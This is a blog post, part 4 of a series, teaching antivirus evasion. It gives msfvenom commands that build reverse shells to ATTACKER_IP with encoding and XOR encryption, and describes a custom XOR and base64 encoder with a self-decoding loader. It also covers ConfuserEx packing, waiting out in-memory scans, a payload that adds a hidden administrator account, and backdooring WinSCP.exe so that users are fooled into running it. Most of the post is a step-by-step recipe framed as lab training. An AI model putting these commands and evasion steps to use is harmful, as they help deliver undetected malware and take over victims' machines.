---
layout: post
title: "AV Evasion Techniques Part 4: Packing and Encoding Payloads for Evasion"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,Cybersecurity]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

**Shellcode Encoding and Encryption**

**Encode using MSFVenom**

Public Tools such as **Metasploit** provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using such features out of the box, chances are your payload will be detected as soon as the file touches the victim’s disk

Let’s generate a simple payload with this method to prove that point. First of all, you can list all of the encoders available to **msfvenom** with the following command:

> **msfvenom — list encoders | grep excellent**

We can indicate we want to use the **shikata\_ga\_nai** encoder with the **-e** encoder switch and then specify we want to encode the payload three times with **-i** (iterations) switch:

> **msfvenom –a x86 –platform windows LHOST=ATTACKER\_IP LPORT=443 –p windows/shell\_reverse\_tcp –e x86/shikata\_ga\_nai –b’\\x00’ –i 3 –f csharp**

> **Payload size: 422 bytes**

> **Final size of sharp file: 2170 bytes**

If we try uploading our newly generated payload to our test machine, the Av will instantly flag it before we even get a chance to execute it.

if encoding doesn’t work, we can always try encrypting the payload intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV, Let’s try that now.

**Encryption using MSFVenom**

You can easily generate encrypted payloads using **msfvenom**. The choices for encryption algorithms are, however, a bit scarce. To list the avaliable encryption algorithms, you can use the following command:

> **msfvenom –list encrypt**

Let’s build an XOR encrypted payload. for this type of algorithm, you will need to specify a key. The command would look as follows:

**Xoring Shellcode using the Metasploit Framework**

> **Msfvenom –p windows/x64/meterpreter/reverse\_tcp LHOST=ATTACKER\_IP LPORT=7788 –f exe –encrypt xor –encrypt-key “keyyyyy” –o xored-revshell.exe**

Payload size: 510 bytes

Final size of exe file: 7168 bytes

**Creating a Custom Payload**

The best way to overcome this is to use our own custom encoding schemes so that the AV doesn’t know what to do to analyze our payload. Notice you don’t have to do anything too complex, as long as it is confusing enough for the AV to analyze. For this task, we will take a simple reverse shell generated by **msfvenom** and use a combination of **XOR** and **Bese64** to bypass Defender.

Let’s start by generating a reverse shell **msfvenom** in CSharp Format:

> **msfvenom LHOST=ATTACKER\_IP LPORT=443 windows/x64/shell\_reverse\_tcp -f csharp**

**The Encoder**

Before building our actual payload, we will create a program that will take the shellcode generated by **msfvenom** and encode it in any way we like. in this case, we will be **XORing** the payload with a custom key first and then encoding it using base64. Here’s the complete code for the encoder.

![](https://cdn-images-1.medium.com/max/800/1*xZVN6iwNUii5hTAN_BUbsA.png)

The code is pretty straightforward and will generate an encoded payload that we will embed on the final payload. Remember to replace the **buf** variable with shellcode you generated with **msfvenom**.

To compile and execute the encoder, we can use the following commands on the Windows machine: **csc.exe Encrypter.cs .\\Encrypter.exe**

**Self-decoding Payload**

Since we have an encoded payload, we need to adjust our code so that it decodes the shellcode before executing it. To match the encoder, we will decode everything in the reverse order we encoded it, so we start by decoding the base64 content and then continue by **XORing** the result with the same key the encoder. Here’s the full payload code:

![](https://cdn-images-1.medium.com/max/800/1*13y0zktfjAk7wcv4vGH3lQ.png)

Note that we have merely combined a couple of really simple techniques that were detected when used separately. Still, the AV won’t complain about the payload this time, as the combination of both methods is not something it can analyze directly.

Let’s compile our payload with the following command on the windows machine.

Compile Our Encrypted Payload:

> **csc.exe EncStageless.cs**

Before running our payload, let’s set up **nc** listener, after copying and executing our payload into the victim machine, we should get a connection back as expected.

**Packers**

Another method to defeat disk-based AV detection is to use a packer. **Packers** are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same. Packers do this with two main goals in mind:

· Compress the program so that it takes up less space

· Protect the program from reverse engineering in general

Packers are commonly used by software developers who would like to protect their software from being reverse engineered or cracked. They achieve some level of protection by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others. As you may have already guessed, packers are also commonly used to obfuscate malware without much effort.

There’s quite a large numbers of packers out there, Including **UPX, IMPRESS, Themida,** and many others.

**Packing an application**

While every packer operates differently, let’s look at a basic example of what a simple packer would do.

When an application is packed, it will be transformed in some way using **packing** function, the packing function needs to be able to obfuscate and transform the original code of the application in a way that can be reasonably reversed by an **unpacking** function so that the original functionality of the application is preserved. While sometimes the packer may add some code (to make debugging the application harder, for example), it will generally want to be able in to get back the original code you wrote when executing it.

![](https://cdn-images-1.medium.com/max/800/1*O_fPAscaKUIRnNUKOWT1Aw.png)

The packed version of the application will contain your packed application code. Since this new packed code is obfuscated, the application needs to be able to unpack the original code from it. To this end, the packer will embed a code stub that contains an unpacker and redirect the main entry point of the executable to it.

When your packed application gets executed, the following will happen:

![](https://cdn-images-1.medium.com/max/800/1*bRwnwx-uPbhu2ZCr_BBxpg.png)

1\. The unpacker gets executed first, as it is the executable’s entry point

3\. The unpacker reads the packed application’s code.

3\. The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.

**Packers and AVs**

By now, we can see how packers help bypass AV solutions. Let’s say you built a reverse shell executable, but the AV is catching it as malicious because it matches a known signature. in this case, using a packer will transform the reverse shell executable so that it doesn’t match any known signatures while on disk. As a result, you should be able to distribute your payload to any machine’s disk without much problem.

AV solutions, however, could still catch your packed application for a couple of reasons:

· While your original code might be transformed in something unrecognizable, remember that the packed executable contains a stub with the unpacker’s code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone.

· At some point, your application will unpack the original code into memory so that it can be executed. If the AV solution you are trying to bypass can do in-memory scans, you might still be detected after your code is unpacked.

**Packing our shellcode**

![](https://cdn-images-1.medium.com/max/800/1*YUL-WRcwssNJYmq1Sw831w.png)

This payload takes a shellcode generated by **msfvenom** and runs it into a separate thread. For this to work, you’ll need to generate a **new** **shellcode** and put it into the shellcode variable of the code:

> **Msfvenom –p windows/x64/shell\_reverse\_tcp LHOST , LPORT –f csharp;**

> **Csc UnEncStagelessPayload.cs**

Once you have a working executable, you can try uploading it to the THM Antivirus Check page, It should be flagged by the AV immediately. Let’s use a packer on the same payload and see what happen.

We will use the **ConfuserEX** packer for this task, as our payloads are programmed on **.NET**. ConfuserEX will require you to indicate the Folders in which it will work. Be sure to select your desktop as the base directory. Once the base directory is set up, drag and drop the executable you want to pack on the interface.

Let’s go to the settings tab and select our payload. Once selected, hit the **“+”** button to add settings to our payload. This should create a rule named “**true**”. Make sure to enable **compression** as well. We will now edit the “**true**” rule and set it to the **Maximum preset**. Finally, we will go to the “**Protect**!” tab and hit ”**Protect**” .

So far, so good, but remember we talked about AVs doing in memory scanning! If you try running a command on your reverse shell, the **AV notice your shell and kill it**. This is because Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such AP calls are used. in the case of any shell generated with **msfvenom**, **CreateProcess()** with invoked and detected.

**So what do we do now?**

there are a couple of simple things you can do to avoid detection:

**Just wait a bit**: try spawning the reverse shell again and wait for around 5 minutes before sending any command, you’ll see the AV won’t complain anymore. The reason for this is that scanning memory is an expensive operation. Therefore, the AV will do it for a while after your process starts but will eventually stop.

**Use smaller payloads:** The smaller the payload, the less like it to be detected. if you use **msfvenom** to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with

**Msfvenom –a x64 –p windows/x64/exec CMD=’net user pwnd Password321 /add; net localgroup administrators pwnd /add’ –f csharp.** And see what happens.

if detection isn’t an issue, you can use a simple trick. from your reverse shell, run **cmd.exe** again. The AV will detect your payload and kill the associated process, but not the new cmd.exe you just spawned!

While every single AV will behave differently, most of the time. There will be a similar way around them, so it’s worth exploring any weird behaviors you notice while testing.

**Binders**

while not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A **binder** is a program that **merges** two (or more) executables into a single one. It is often used when you want to distribute your payload hidden inside another known program to fool users into believing they are executing a different program.

![](https://cdn-images-1.medium.com/max/800/1*_3Yj3-ayNifrG9fs7tiaXQ.png)

While every single binder might work slightly differently, they will basically add the code of your shellcode inside the legitimate program and have it executed somehow.

You could, for example, change the entry point in **the PE header** so that your shellcode executes right before the program and then **redirect** the execution back to the legitimate program once it is finished. This way, when the user clicks the resulting executable, your shellcode will get **silently** executed first and continue running the program normally without the user noticing it.

**Binding with msfvenom**

You can easily plant a payload of your preference in any **.exe** File with **msfvenom.** The binary will still work as usual but execute an additional payload silently. The method used by **msfvenom** injects your malicious program by **creating** an **extra thread** for it, so it is slightly different from what was mentioned before but achieves the same result. Having a separate thread is even better since your program won’t get blocked in case your shellcode fails for some reason.

For this task, will be **backdooring** the **WinSCP** executable.

> **Msfvenom –x WinSCP.exe –k –p windows/shell\_reverse\_tcp LHOST,LPORT –f exe –o WinSCP-evil.exe**

The resulting **WinSCP-evil.exe** will execute a **reverse\_tcp meterpreter** payload without the user noticing it. Before anything else, remember to set up an **nc** listener to receive the reverse shell. When you execute your **backdoored** executable, it should launch a reverse shell back at you while continuing to execute **WinSCP.exe** for the use.

**Binders and AV**

Binders won’t do much to hide your payload from an AV solution, the simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did.

The **main** use of binders is to **fool users** into believing they are executing a legitimate executable rather than a malicious payload.

By [Moataz Osama](https://medium.com/@mezo512) on [February 3, 2025](https://medium.com/p/6244d95e8f65).

[Canonical link](https://medium.com/@mezo512/av-evasion-techniques-part-4-packing-encoding-payloads-for-evasion-6244d95e8f65)

Exported from [Medium](https://medium.com) on August 26, 2025.